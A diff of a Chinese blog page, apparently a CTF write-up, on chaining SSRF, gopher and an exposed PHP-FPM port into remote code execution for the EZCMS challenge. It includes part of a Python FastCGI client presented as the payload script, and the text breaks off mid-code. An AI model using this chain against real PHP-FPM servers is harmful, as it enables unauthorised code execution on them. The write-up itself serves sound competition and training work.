@@ -1,162 +1,245 @@
 <!DOCTYPE html>
-<html lang=zh>
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="取自2019高校运维赛 EZCMS  SSRF第一步发现存在SSRF第二步通过Dockerfile看到PHP-FPM开放端口为9000而且这个默认使用CURL，因此通过SSRF+GOPHER+FPM RCE RCE构造payload 1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
-<meta name="keywords" content="php,SSRF,fpm">
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"http:/blog.boyblog.club","root":"/","scheme":"Gemini","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="取自2019高校运维赛 EZCMS SSRF 第一步发现存在SSRF第二步通过Dockerfile看到PHP-FPM开放端口为9000而且这个默认使用CURL，因此通过SSRF+GOPHER+FPM RCE RCE构造payload 1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
+<meta name="keywords" content="SSRF,php,fpm">
 <meta property="og:type" content="article">
 <meta property="og:title" content="curl-SSRF+FPM造成RCE">
 <meta property="og:url" content="http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/index.html">
 <meta property="og:site_name" content="Sndav&#39;s Blog">
-<meta property="og:description" content="取自2019高校运维赛 EZCMS  SSRF第一步发现存在SSRF第二步通过Dockerfile看到PHP-FPM开放端口为9000而且这个默认使用CURL，因此通过SSRF+GOPHER+FPM RCE RCE构造payload 1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
-<meta property="og:locale" content="zh-Hasn">
+<meta property="og:description" content="取自2019高校运维赛 EZCMS SSRF 第一步发现存在SSRF第二步通过Dockerfile看到PHP-FPM开放端口为9000而且这个默认使用CURL，因此通过SSRF+GOPHER+FPM RCE RCE构造payload 1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://md.byr.moe/uploads/upload_400c244550869f12533f16320806f502.png">
 <meta property="og:image" content="https://md.byr.moe/uploads/upload_d560d96b35c376853a1b323aa2dfa182.png">
 <meta property="og:image" content="https://md.byr.moe/uploads/upload_d95ff4da13ee28b5fe8601c58b14c4cf.png">
-<meta property="og:updated_time" content="2019-11-22T03:11:52.607Z">
+<meta property="og:updated_time" content="2020-02-27T03:39:11.427Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="curl-SSRF+FPM造成RCE">
-<meta name="twitter:description" content="取自2019高校运维赛 EZCMS  SSRF第一步发现存在SSRF第二步通过Dockerfile看到PHP-FPM开放端口为9000而且这个默认使用CURL，因此通过SSRF+GOPHER+FPM RCE RCE构造payload 1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
+<meta name="twitter:description" content="取自2019高校运维赛 EZCMS SSRF 第一步发现存在SSRF第二步通过Dockerfile看到PHP-FPM开放端口为9000而且这个默认使用CURL，因此通过SSRF+GOPHER+FPM RCE RCE构造payload 1234567891011121314151617181920212223242526272829303132333435363738394041424344454">
 <meta name="twitter:image" content="https://md.byr.moe/uploads/upload_400c244550869f12533f16320806f502.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>curl-SSRF+FPM造成RCE</title>
-    <!-- styles -->
-    <link rel="stylesheet" href="/css/style.css">
-    <!-- persian styles -->
-    
-      <link rel="stylesheet" href="/css/rtl.css">
-    
-    <!-- rss --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
-    
-    
-</head>
 
-<body class="max-width mx-auto px3 ltr">
-    
-      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/archives">Writing</a></li>
-         
-          <li><a href="/tags">Tags</a></li>
-         
-          <li><a href="/categories/">Categories</a></li>
-         
-          <li><a href="/search/">Search</a></li>
-        
-      </ul>
-    </span>
-    <br>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2020/01/17/PHP源码分析-零-调试环境搭建/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/09/30/ThinkPHP6-0反序列化利用链/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&text=curl-SSRF+FPM造成RCE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&title=curl-SSRF+FPM造成RCE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&is_video=false&description=curl-SSRF+FPM造成RCE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=curl-SSRF+FPM造成RCE&body=Check out this article: http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&title=curl-SSRF+FPM造成RCE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&title=curl-SSRF+FPM造成RCE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&title=curl-SSRF+FPM造成RCE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&title=curl-SSRF+FPM造成RCE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&name=curl-SSRF+FPM造成RCE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">2.</span> <span class="toc-text">RCE</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        curl-SSRF+FPM造成RCE
-    </h1>
+<link rel="canonical" href="http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/">
 
 
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
 
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">Sndav's Blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-11-22T03:05:45.000Z" itemprop="datePublished">2019-11-22</time>
-        
-      
-    </div>
-
-
-      
-
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/SSRF/">SSRF</a>, <a class="tag-link" href="/tags/fpm/">fpm</a>, <a class="tag-link" href="/tags/php/">php</a>
-    </div>
-
-
-    </div>
-  </header>
+  <title>curl-SSRF+FPM造成RCE | Sndav's Blog</title>
   
 
-  <div class="content" itemprop="articleBody">
-    <blockquote>
-<p>取自2019高校运维赛 EZCMS</p>
-</blockquote>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>第一步发现<br><img src="https://md.byr.moe/uploads/upload_400c244550869f12533f16320806f502.png" alt><br>存在SSRF<br>第二步通过Dockerfile看到PHP-FPM开放端口为9000<br><img src="https://md.byr.moe/uploads/upload_d560d96b35c376853a1b323aa2dfa182.png" alt>而且这个默认使用CURL，因此通过SSRF+GOPHER+FPM RCE</p>
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sndav's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Sndav@Dubhe">
+      <meta itemprop="description" content="A Dubhe CTFer lives harder and harder">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sndav's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          curl-SSRF+FPM造成RCE
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-22 11:05:45" itemprop="dateCreated datePublished" datetime="2019-11-22T11:05:45+08:00">2019-11-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-27 11:39:11" itemprop="dateModified" datetime="2020-02-27T11:39:11+08:00">2020-02-27</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>取自2019高校运维赛 EZCMS<br><a id="more"></a></p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2></blockquote>
+<p>第一步发现<br><img src="https://md.byr.moe/uploads/upload_400c244550869f12533f16320806f502.png" alt><br>存在SSRF<br>第二步通过Dockerfile看到PHP-FPM开放端口为9000<br><img src="https://md.byr.moe/uploads/upload_d560d96b35c376853a1b323aa2dfa182.png" alt>而且这个默认使用CURL，因此通过SSRF+GOPHER+FPM RCE</p>
 <h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>构造payload</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += 